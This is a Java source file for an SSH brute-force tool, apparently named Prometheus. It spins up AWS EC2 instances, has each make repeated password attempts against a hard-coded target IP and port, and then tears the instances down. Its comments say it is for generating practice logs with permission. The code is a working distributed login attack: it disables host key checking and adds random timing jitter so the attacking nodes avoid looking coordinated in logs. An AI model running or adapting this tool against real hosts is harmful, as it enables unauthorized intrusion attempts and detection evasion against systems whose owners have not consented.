/*
 * Copyright 2010-2013 Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License").
 * You may not use this file except in compliance with the License.
 * A copy of the License is located at
 *
 *  http://aws.amazon.com/apache2.0
 *
 * or in the "license" file accompanying this file. This file is distributed
 * on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
 * express or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 */
package thundr.prometheus;

import com.amazonaws.regions.Region;
import com.amazonaws.regions.Regions;
import com.amazonaws.services.ec2.AmazonEC2Client;
import com.amazonaws.services.ec2.model.*;
import com.jcraft.jsch.Channel;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.util.ArrayList;
import java.util.Random;

/*
    SSH bruteforcing utility using AWS EC2
    Designed for generating controlled logs for practice and simulation.
    NOT intended for any illegal activity. Get permission before testing :)
 */

public class Prometheus {

    //ip to attack from your instances
    public static String ipAttack = "34.220.122.155";
    //image to use for instances, this one is ubuntu server
    public static String amiImage = "ami-db710fa3";
    //security group to use for instances, make sure this has ssh port unblocked
    public static String sgId = "sg-31eb1541";
    //the name of the key that AWS will spin the instance up with (from your AWS keystore)
    public static String keyName = "1";
    // this must be the private key that corresponds to the saved key under keyName
    public static String privateKey = "~/.ssh/id_aws1/1.pem";
    //port to attack on the VICTIM, not the port to use logging into instances
    public static int port = 1701;
    //how many instances to spin up (make sure you check your EC2 limits)
    public static int count = 1;
    // upper bound for number of attacks per node * 3
    public static int attackCount = 25;

    public static void main(String[] args){

        System.out.println("\u001B[36m   ___   ___   ____   __  ___ ____ ______ __ __ ____ __  __ ____  ____ ____ __ __\u001B[0m");
        System.out.println("\u001B[36m  / _ \\ / _ \\ / __ \\ /  |/  // __//_  __// // // __// / / // __/ / __// __// // /\u001B[0m");
        System.out.println("\u001B[36m / ___// , _// /_/ // /|_/ // _/   / /  / _  // _/ / /_/ /_\\ \\  _\\ \\ _\\ \\ / _  / \u001B[0m");
        System.out.println("\u001B[36m/_/   /_/|_| \\____//_/  /_//___/  /_/  /_//_//___/ \\____//___/ /___//___//_//_/  \u001B[0m");
        System.out.println("\u001B[34m===============================================================================\u001B[0m");
        System.out.println("PROMETHEUS SSH TOOL");
        System.out.println("by @thundR - github.com/thundR");
        System.out.println("\u001B[34m===============================================================================\u001B[0m");

        Region region = Region.getRegion(Regions.US_WEST_2);

        AmazonEC2Client client = new AmazonEC2Client();
        client.setRegion(region);

        ArrayList<String> instanceIds = new ArrayList<>();
        System.out.println("Spinning up " + count + " instances and attacking " + ipAttack + " on port " + port);
        RunInstancesRequest run = new RunInstancesRequest();
        run.withImageId(amiImage)
                .withInstanceType(InstanceType.T2Micro)
                .withMinCount(count)
                .withMaxCount(count)
                .withKeyName(keyName)
                .withSecurityGroupIds(sgId);

        RunInstancesResult result = client.runInstances(run);
        result.getReservation().getInstances().forEach(value ->
                instanceIds.add(value.getInstanceId())
        );

        System.out.println("Waiting for AWS IP designation...");

        //trying to get ips instantly from the reservation always fails, this lets
        //us wait until they are allocated by AWS
        sleep(5000);

        ArrayList<String> ips = getIpsOfInstances(instanceIds, client);

        System.out.println("Waiting for instances to start...");

        //instances need time to boot up so we can ssh into them
        sleep(40000);

        System.out.println("Attacking with " + ips.size() + " threads...");

        ArrayList<AttackThreaded> threadList = new ArrayList<>();

        for(String ip : ips){
            AttackThreaded t = new  AttackThreaded(ip);

            //give us some wiggle room in the logs, so it doesn't look like a bunch of nodes attacking in sync
            sleep(50);
            if(new Random().nextInt(10) == 5){
                sleep(400);
            }
            else if(new Random().nextInt(10) == 7){
                sleep(1000);
            }

            t.start();
            threadList.add(t);
        }

        //block until all threads have finished attacking
        boolean notDone = true;
        while(notDone){
            notDone = false;
            for(AttackThreaded t : threadList){
                if(t.getT().isAlive()){
                    notDone = true;
                }
            }
        }

        System.out.println("Done attacking, terminating instances...");

        TerminateInstancesRequest request = new TerminateInstancesRequest(instanceIds);
        client.terminateInstances(request);

        System.out.println("Bye!");
    }

    public static class AttackThreaded implements Runnable{

        private Thread t;
        String ip;

        public AttackThreaded(String ip){
            this.ip = ip;
        }

        public void run(){
            try{
                JSch jsch = new JSch();
                jsch.addIdentity(privateKey);

                Session session = jsch.getSession("ubuntu", ip);

                java.util.Properties config = new java.util.Properties();
                config.put("StrictHostKeyChecking", "no");
                session.setConfig(config);
                session.connect();

                Channel channel = session.openChannel("shell");

                Expect expect = new Expect(channel.getInputStream(),
                        channel.getOutputStream());


                channel.connect(3*1000);

                expect.expect("$");
                expect.send("ssh -o StrictHostKeyChecking=no ubuntu@" + ipAttack + " -p " + port + "\n");

                int times = new Random().nextInt(attackCount) + 1;
                System.out.println("Attacking " + (times * 3) + " times from thread " + t.getId());
                attemptLogin(times, expect);

                expect.close();
                session.disconnect();

                System.out.println("Thread " + t.getId() + " has finished.");

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public void start () {
            if (t == null) {
                t = new Thread (this);
                t.start ();
            }
        }

        public Thread getT() {
            return t;
        }
    }


    public static void attemptLogin(int times, Expect expect){

        for (int i = 0; i < times; i++) {
            for (int j = 0; j < 3; j++) {
                expect.expect("password:");
                expect.send("1 \n");
                sleep(50);
            }
            expect.expect("$");
            expect.send("ssh -o StrictHostKeyChecking=no ubuntu@" + ipAttack + " -p " + port + "\n");
        }
    }

    public static void sleep(long time){
        try {
            Thread.sleep(time);
        }
        catch(InterruptedException ex) {
            Thread.currentThread().interrupt();
        }
    }

    public static ArrayList<String> getIpsOfInstances(ArrayList<String> instanceIds, AmazonEC2Client client){
        ArrayList<String> ips = new ArrayList<>();

        DescribeInstancesRequest request = new DescribeInstancesRequest();
        request.setInstanceIds(instanceIds);

        DescribeInstancesResult instancesResult = client.describeInstances(request);
        ArrayList<Reservation> reservations = new ArrayList<>(instancesResult.getReservations());

        ArrayList<Instance> instances;
        for (Reservation res : reservations) {
            instances = new ArrayList<>(res.getInstances());
            for (Instance ins : instances) {
                System.out.println("Public IP from " + ins.getInstanceId() + " is " + ins.getPublicIpAddress());
                ips.add(ins.getPublicIpAddress());
            }
        }
        return ips;
    }
}
